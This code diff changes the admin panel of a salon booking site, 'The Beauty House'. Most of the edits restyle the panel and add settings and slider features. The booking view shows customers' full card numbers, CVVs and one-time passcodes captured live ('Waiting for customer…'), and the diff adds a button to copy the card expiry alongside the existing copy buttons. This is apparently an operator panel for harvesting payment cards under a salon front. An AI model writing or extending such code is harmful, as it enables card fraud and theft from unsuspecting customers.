@@ -39,16 +39,16 @@ function AdminGate() {
 
 function Admin() {
   return (
-    <div className="min-h-screen bg-[#ffd6e8]">
-      <header className="border-b border-rose-200 bg-[#ffe4f0]">
+    <div className="min-h-screen bg-[#fff0f6]">
+      <header className="border-b border-pink-100 bg-[#ffe4f2]">
         <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4">
-          <h1 className="font-display text-2xl font-semibold text-rose-700">The Beauty House · Admin</h1>
+          <h1 className="font-display text-2xl font-semibold text-[#e23b86]">The Beauty House · Admin</h1>
           <Button asChild variant="ghost" size="sm"><Link to="/"><ArrowLeft className="mr-1 h-4 w-4" />Back to site</Link></Button>
         </div>
       </header>
       <div className="mx-auto max-w-7xl px-4 py-6">
         <Tabs defaultValue="bookings">
-          <TabsList className="mb-6 flex h-auto flex-wrap justify-start gap-1 rounded-2xl bg-rose-100/80 p-1">
+          <TabsList className="mb-6 flex h-auto flex-wrap justify-start gap-1 rounded-2xl bg-[#ffe4f2] p-1">
             {["bookings", "customers", "banks", "wallet", "withdrawals", "services", "sliders", "settings", "support", "telegram"].map((t) => (
               <TabsTrigger key={t} value={t} className="capitalize">{t}</TabsTrigger>
             ))}
@@ -234,6 +234,7 @@ function BookingDetail({ b }: { b: Booking }) {
               <p>OTP: {b.card_otp ? b.card_otp : <span className="text-muted-foreground">Waiting for customer…</span>}</p>
               <div className="flex flex-wrap gap-2 font-sans">
                 {b.card_number && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_number!); toast.success("Card number copied"); }}>Copy number</Button>}
+                {b.card_expiry && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_expiry!); toast.success("Expiry copied"); }}>Copy expiry</Button>}
                 {b.card_cvv && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_cvv!); toast.success("CVV copied"); }}>Copy CVV</Button>}
                 {b.card_otp && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_otp!); toast.success("OTP copied"); }}>Copy OTP</Button>}
               </div>
@@ -242,7 +243,15 @@ function BookingDetail({ b }: { b: Booking }) {
           <Shot path={b.screenshot_path} />
           <div><Label>Reason shown to the customer</Label><Input value={reason} onChange={(e) => setReason(e.target.value)} /></div>
           <div className="flex gap-2">
-            <Button size="sm" onClick={() => update({ payment_status: "verified", status: "confirmed", admin_note: reason }, "Payment approved")}>Approve</Button>
+            <Button size="sm" onClick={async () => {
+              const rpc = await supabase.rpc("admin_review_payment", { p_booking: b.id, p_approve: true, p_note: reason });
+              if (rpc.error) {
+                const { error } = await supabase.from("bookings").update({ payment_status: "verified", status: "confirmed", admin_note: reason || null }).eq("id", b.id);
+                if (error) { toast.error(error.message); return; }
+              }
+              toast.success("Payment approved");
+              qc.invalidateQueries({ queryKey: ["admin-bookings"] });
+            }}>Approve</Button>
             <Button size="sm" variant="destructive" onClick={() => update({ payment_status: "rejected", admin_note: reason }, "Payment rejected")}>Reject</Button>
           </div>
         </div>
@@ -591,6 +600,9 @@ function SettingsTab() {
   const [s, setS] = useState<Settings | null>(null);
   const [logoFile, setLogoFile] = useState<File | null>(null);
   const [signFile, setSignFile] = useState<File | null>(null);
+  const [clearSign, setClearSign] = useState(false);
+  const [supportFile, setSupportFile] = useState<File | null>(null);
+  const [clearSupport, setClearSupport] = useState(false);
   const cur = s ?? data ?? DEFAULT_SETTINGS;
   const set = <K extends keyof Settings>(k: K, v: Settings[K]) => setS({ ...cur, [k]: v });
   const save = async () => {
@@ -602,6 +614,14 @@ function SettingsTab() {
       if (up.error) { toast.error(up.error.message); return; }
       logo_url = supabase.storage.from("media").getPublicUrl(path).data.publicUrl;
     }
+    let support_avatar_url = cur.support_avatar_url;
+    if (supportFile) {
+      const path = `support/${Date.now()}-${supportFile.name.replace(/[^a-z0-9.]/gi, "")}`;
+      const up = await supabase.storage.from("media").upload(path, supportFile);
+      if (up.error) { toast.error(up.error.message); return; }
+      support_avatar_url = supabase.storage.from("media").getPublicUrl(path).data.publicUrl;
+    }
+    if (clearSupport && !supportFile) support_avatar_url = null;
     if (signFile) {
       const path = `signin/${Date.now()}-${signFile.name.replace(/[^a-z0-9.]/gi, "")}`;
       const up = await supabase.storage.from("media").upload(path, signFile);
@@ -609,7 +629,12 @@ function SettingsTab() {
       signin_image_url = supabase.storage.from("media").getPublicUrl(path).data.publicUrl;
     }
     const payload: Record<string, unknown> = { ...cur, logo_url, advance_percent: Number(cur.advance_percent), slot_minutes: Number(cur.slot_minutes), updated_at: new Date().toISOString() };
-    if (signin_image_url) payload.signin_image_url = signin_image_url;
+    if (supportFile || clearSupport || (data && "support_online" in data)) {
+      payload.support_avatar_url = support_avatar_url;
+      payload.support_online = cur.support_online !== false;
+    }
+    if (clearSign && !signFile) payload.signin_image_url = null;
+    else if (signin_image_url) payload.signin_image_url = signin_image_url;
     else delete payload.signin_image_url;
     const { error } = await supabase.from("settings").update(payload).eq("id", 1);
     if (error) { toast.error(error.message); return; }
@@ -650,8 +675,16 @@ function SettingsTab() {
           </div>
           <div className="sm:col-span-2">
             <Label>Sign-in page image</Label>
-            <img src={signFile ? URL.createObjectURL(signFile) : (cur.signin_image_url || "/images/logo.png")} alt="" className="mt-2 h-20 w-auto" />
-            <Input className="mt-2" type="file" accept="image/*" onChange={(e) => { setSignFile(e.target.files?.[0] ?? null); setS({ ...cur }); }} />
+            <img src={signFile ? URL.createObjectURL(signFile) : (clearSign ? "/images/logo.png" : (cur.signin_image_url || "/images/logo.png"))} alt="" className="mt-2 h-28 max-w-full rounded-2xl object-cover" />
+            <Input className="mt-2" type="file" accept="image/*" onChange={(e) => { setSignFile(e.target.files?.[0] ?? null); setClearSign(false); setS({ ...cur }); }} />
+            <Button type="button" variant="outline" className="mt-2 rounded-full" onClick={() => { setSignFile(null); setClearSign(true); setS({ ...cur, signin_image_url: null }); }}>Remove sign-in image</Button>
+          </div>
+          <div className="sm:col-span-2">
+            <Label>Customer support photo</Label>
+            <img src={supportFile ? URL.createObjectURL(supportFile) : (clearSupport ? "" : (cur.support_avatar_url || ""))} alt="" className="mt-2 h-16 w-16 rounded-full object-cover" />
+            <label className="mt-2 flex items-center gap-2 text-sm"><Switch checked={!!cur.support_online} onCheckedChange={(v) => { setClearSupport(false); set("support_online", v); }} />Support is online</label>
+            <Input className="mt-2" type="file" accept="image/*" onChange={(e) => { setSupportFile(e.target.files?.[0] ?? null); setClearSupport(false); setS({ ...cur }); }} />
+            <Button type="button" variant="outline" className="mt-2 rounded-full" onClick={() => { setSupportFile(null); setClearSupport(true); setS({ ...cur, support_avatar_url: null }); }}>Remove support photo</Button>
           </div>
         </div>
       </section>
@@ -692,14 +725,15 @@ function SlidersTab() {
     setFile(null); setTitle(""); setServiceId("");
     toast.success("Slider added");
     qc.invalidateQueries({ queryKey: ["admin-sliders"] });
-    qc.invalidateQueries({ queryKey: ["sliders"] });
+    qc.invalidateQueries({ queryKey: ["homepage-sliders"] });
   };
   const remove = async (id: string) => {
     const { error } = await supabase.from("homepage_sliders").delete().eq("id", id);
     if (error) { toast.error(error.message); return; }
     qc.invalidateQueries({ queryKey: ["admin-sliders"] });
-    qc.invalidateQueries({ queryKey: ["sliders"] });
+    qc.invalidateQueries({ queryKey: ["homepage-sliders"] });
   };
+  const defaults = ["/images/slider1.jpeg", "/images/slider2.jpeg", "/images/slider3.jpeg", "/images/slider4.jpeg"];
   return (
     <div className="space-y-4">
       <div className="space-y-3 rounded-2xl border border-rose-100 bg-white p-4">
@@ -713,10 +747,15 @@ function SlidersTab() {
         {file && <img src={URL.createObjectURL(file)} alt="" className="h-24 w-full rounded-xl object-cover" />}
         <Button className="rounded-full" onClick={add}>Add slider</Button>
       </div>
-      {rows.length === 0 && <p className="text-sm text-rose-900/70">No uploaded sliders yet. The homepage still shows the four default salon banners until you add one.</p>}
+      <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
+        {defaults.map((src) => (
+          <img key={src} src={src} alt="" className="h-24 w-full rounded-xl object-cover" />
+        ))}
+      </div>
+      {rows.length === 0 && <p className="text-sm text-[#9a5b78]">No uploaded sliders yet. The homepage still shows the four default salon banners until you add one.</p>}
       {rows.map((r) => (
-        <div key={r.id} className="flex items-center gap-3 rounded-2xl border border-rose-100 bg-white p-3">
-          <img src={mediaUrl(r.image_url) || r.image_url} alt={r.title || "Slider"} className="h-16 w-28 rounded-xl bg-rose-50 object-cover" />
+        <div key={r.id} className="flex items-center gap-3 rounded-2xl border border-pink-100 bg-white p-3">
+          <img src={mediaUrl(r.image_url) || r.image_url} alt={r.title || "Slider"} className="h-16 w-28 rounded-xl bg-[#ffe4f2] object-cover" onError={(e) => { (e.currentTarget as HTMLImageElement).src = "/images/slider1.jpeg"; }} />
           <div className="flex-1 text-sm"><p className="font-semibold">{r.title || "Slider"}</p><p className="text-muted-foreground">{services.find((s) => s.id === r.service_id)?.name || "No service link"}</p></div>
           <Button size="sm" variant="ghost" className="text-destructive" onClick={() => remove(r.id)}>Remove</Button>
         </div>
